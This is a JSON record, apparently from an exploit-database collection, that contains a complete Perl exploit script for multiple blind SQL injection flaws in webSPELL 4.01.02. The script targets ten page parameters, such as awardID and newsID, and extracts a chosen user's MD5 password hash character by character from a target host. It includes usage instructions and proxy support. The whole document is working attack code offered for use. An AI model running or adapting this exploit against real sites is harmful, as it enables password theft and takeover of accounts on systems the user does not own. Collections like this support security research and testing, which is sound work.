{
  "id": "3400",
  "title": "webSPELL 4.01.02 - Multiple SQL Injections",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\nuse LWP::UserAgent;\r\nuse Getopt::Long;\r\n\r\nif(!$ARGV[3])\r\n{\r\n  print \"\\n                           \\\\#'#/                        \";\r\n  print \"\\n                           (-.-)                         \";\r\n  print \"\\n   -------------------oOO---(_)---OOo--------------------\";\r\n  print \"\\n   | webSPELL <= v4.01.02 Multiple Remote SQL Injection |\";\r\n  print \"\\n   |                   coded by DNX                     |\";\r\n  print \"\\n   ------------------------------------------------------\";\r\n  print \"\\n[!] Solution: install security fix\";\r\n  print \"\\n[!] Usage: perl ws.pl [Host] [Path] [Target] <Options>\";\r\n  print \"\\n[!] Example: perl ws.pl 127.0.0.1 /webspell/ -0 -id 1\";\r\n  print \"\\n[!] Targets:\";\r\n  print \"\\n       -0            Bug in awards.php line 207, inject code in \\$awardID\";\r\n  print \"\\n       -1            Bug in clanwars_details.php line 36, inject code in \\$cwID\";\r\n  print \"\\n       -2            Bug in demos.php line 301, inject code in \\$demoID\";\r\n  print \"\\n       -3            Bug in profile.php line 37, inject code in \\$id\";\r\n  print \"\\n       -4            Bug in links.php line 139, inject code in \\$linkcatID\";\r\n  print \"\\n       -5            Bug in faq.php line 37, inject code in \\$faqcatID\";\r\n  print \"\\n       -6            Bug in faq.php line 72, inject code in \\$faqID\";\r\n  print \"\\n       -7            Bug in articles.php line 256, inject code in \\$articlesID\";\r\n  print \"\\n       -8            Bug in news_comments.php line 38, inject code in \\$newsID\";\r\n  print \"\\n       -9            Bug in cash_box.php line 119, inject code in \\$id\";\r\n  print \"\\n[!] Options:\";\r\n  print \"\\n       -id [no]      Valid ID for \\$awardID, \\$cwID, \\$demoID, \\$newsID, ...\";\r\n  print \"\\n       -uid [no]     User-ID, default is 1\";\r\n  print \"\\n       -t [name]     Changed the user table name, default is webs_user\";\r\n  print \"\\n       -p [ip:port]  Proxy support\";\r\n  print \"\\n\";\r\n  exit;\r\n}\r\n\r\nmy $host    = $ARGV[0];\r\nmy $path    = $ARGV[1];\r\nmy $user    = 1;\r\nmy $table   = \"webs_user\";\r\nmy $id      = 0;\r\nmy %options = ();\r\nGetOptions(\\%options, \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"id=i\", \"uid=i\", \"t=s\", \"p=s\");\r\n\r\nprint \"[!] Exploiting...\\n\";\r\n\r\nif($options{\"id\"})\r\n{\r\n  $id = $options{\"id\"};\r\n}\r\nelse\r\n{\r\n  print \"[!] Exploit failed, missing parameter\\n\";\r\n  exit;\r\n}\r\n\r\nif($options{\"uid\"})\r\n{\r\n  $user = $options{\"uid\"};\r\n}\r\n\r\nif($options{\"t\"})\r\n{\r\n  $table = $options{\"t\"};\r\n}\r\n\r\nsyswrite(STDOUT, \"[!] MD5-Hash: \", 14);\r\n\r\nfor(my $i = 1; $i <= 32; $i++)\r\n{\r\n  my $found = 0;\r\n  my $h = 48;\r\n  while(!$found && $h <= 57)\r\n  {\r\n    if(istrue3($host, $path, $table, $id, $user, $i, $h))\r\n    {\r\n      $found = 1;\r\n      syswrite(STDOUT, chr($h), 1);\r\n    }\r\n    $h++;\r\n  }\r\n  if(!$found)\r\n  {\r\n    $h = 97;\r\n    while(!$found && $h <= 122)\r\n    {\r\n      if(istrue3($host, $path, $table, $id, $user, $i, $h))\r\n      {\r\n        $found = 1;\r\n        syswrite(STDOUT, chr($h), 1);\r\n      }\r\n      $h++;\r\n    }\r\n  }\r\n}\r\n\r\nprint \"\\n[!] Exploit done\\n\";\r\n\r\nsub istrue3\r\n{\r\n  my $host   = shift;\r\n  my $path   = shift;\r\n  my $table  = shift;\r\n  my $id     = shift;\r\n  my $uid    = shift;\r\n  my $i      = shift;\r\n  my $h      = shift;\r\n  my $url    = \"http://\".$host.$path;\r\n  my $regexp = \"\";\r\n  \r\n  my $ua = LWP::UserAgent->new;\r\n  \r\n  if($options{\"0\"})\r\n  {\r\n    $url .= \"index.php?site=awards&action=details&awardID=\".$id.\"'%20AND%20SUBSTRING((SELECT%20password%20FROM%20\".$table.\"%20WHERE%20userID=\".$uid.\"),\".$i.\",1)=CHAR(\".$h.\")/*\";  \r\n    $regexp = \"Event: -\";\r\n  }\r\n  if($options{\"1\"})\r\n  {\r\n    $url .= \"index.php?site=clanwars_details&cwID=\".$id.\"'%20AND%20SUBSTRING((SELECT%20password%20FROM%20\".$table.\"%20WHERE%20userID=\".$uid.\"),\".$i.\",1)=CHAR(\".$h.\")/*\";\r\n    $regexp = \"<img src=\\\"images\\/games\\/\\.gif\";\r\n  }\r\n  if($options{\"2\"})\r\n  {\r\n    $url .= \"index.php?site=demos&action=showdemo&demoID=\".$id.\"'%20AND%20SUBSTRING((SELECT%20password%20FROM%20\".$table.\"%20WHERE%20userID=\".$uid.\"),\".$i.\",1)=CHAR(\".$h.\")/*\";\r\n    $regexp = \"<img src=\\\"images\\/games\\/\\.gif\";\r\n  }\r\n  if($options{\"3\"})\r\n  {\r\n    $url .= \"index.php?site=profile&action=buddys&id=\".$id.\"'%20AND%20SUBSTRING((SELECT%20password%20FROM%20\".$table.\"%20WHERE%20userID=\".$uid.\"),\".$i.\",1)=CHAR(\".$h.\")/*\";\r\n    $regexp = \"no buddys\";\r\n  }\r\n  if($options{\"4\"})\r\n  {\r\n    $url .= \"index.php?site=links&action=show&linkcatID=\".$id.\"'%20AND%20SUBSTRING((SELECT%20password%20FROM%20\".$table.\"%20WHERE%20userID=\".$uid.\"),\".$i.\",1)=CHAR(\".$h.\")/*\";\r\n    $regexp = \"no links available\";\r\n  }\r\n  if($options{\"5\"})\r\n  {\r\n    $url .= \"index.php?site=faq&action=faqcat&faqcatID=\".$id.\"'%20AND%20SUBSTRING((SELECT%20password%20FROM%20\".$table.\"%20WHERE%20userID=\".$uid.\"),\".$i.\",1)=CHAR(\".$h.\")/*\";\r\n    $regexp = \"no faq available\";\r\n  }\r\n  if($options{\"6\"})\r\n  {\r\n    $url .= \"index.php?site=faq&action=faq&faqID=\".$id.\"'%20AND%20SUBSTRING((SELECT%20password%20FROM%20\".$table.\"%20WHERE%20userID=\".$uid.\"),\".$i.\",1)=CHAR(\".$h.\")/*\";\r\n    $regexp = \"no faq available\";\r\n  }\r\n  if($options{\"7\"})\r\n  {\r\n    $url .= \"index.php?site=articles&action=show&articlesID=\".$id.\"'%20AND%20SUBSTRING((SELECT%20password%20FROM%20\".$table.\"%20WHERE%20userID=\".$uid.\"),\".$i.\",1)=CHAR(\".$h.\")/*\";\r\n    $regexp = \"no entries\";\r\n  }\r\n  if($options{\"8\"})\r\n  {\r\n    $url .= \"index.php?site=news_comments&newsID=\".$id.\"'%20AND%20SUBSTRING((SELECT%20password%20FROM%20\".$table.\"%20WHERE%20userID=\".$uid.\"),\".$i.\",1)=CHAR(\".$h.\")/*\";\r\n    $regexp = \"no version in selected language available\";\r\n  }\r\n  if($options{\"9\"})\r\n  {\r\n    $url .= \"index.php?site=cash_box&action=edit&id=\".$id.\"'%20AND%20SUBSTRING((SELECT%20password%20FROM%20\".$table.\"%20WHERE%20userID=\".$uid.\"),\".$i.\",1)=CHAR(\".$h.\")/*\";\r\n    $regexp = \"<textarea name=\\\"info\\\" cols=\\\"50\\\" rows=\\\"7\\\"><\\/textarea>\";\r\n  }\r\n  \r\n  if($options{\"p\"})\r\n  {\r\n    $ua->proxy('http', \"http://\".$options{\"p\"});\r\n  }\r\n  \r\n  my $response = $ua->get($url);\r\n  my $content = $response->content;\r\n  \r\n  if($content !~ /$regexp/)\r\n  {\r\n    return 1;\r\n  }\r\n  else\r\n  {\r\n    return 0;\r\n  }\r\n}\r\n\r\n# milw0rm.com [2007-03-02]",
  "url": "https://www.exploit-db.com/exploits/3400"
}